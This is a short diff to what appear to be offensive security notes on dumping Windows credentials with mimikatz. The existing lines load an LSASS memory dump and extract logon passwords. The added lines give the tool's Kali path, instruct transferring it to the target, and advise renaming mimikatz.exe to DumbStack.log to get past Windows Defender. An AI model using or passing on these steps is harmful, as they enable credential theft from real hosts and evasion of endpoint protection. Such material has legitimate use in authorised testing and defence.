@@ -254,6 +254,10 @@ sekurlsa::minidump C:\Users\joe\debug<PID>
 sekurlsa::logonPasswords
 
 - mimikatz.exe
+/usr/share/windows-resources/mimikatz/x64/
+Transfer file to target.
+Rename mimikatz.exe to DumbStack.log to bypass Windows Defender.
+DumbStack.log
 sekurlsa::minidump lsass.dmp
 log lsass.txt
 sekurlsa::logonPasswords
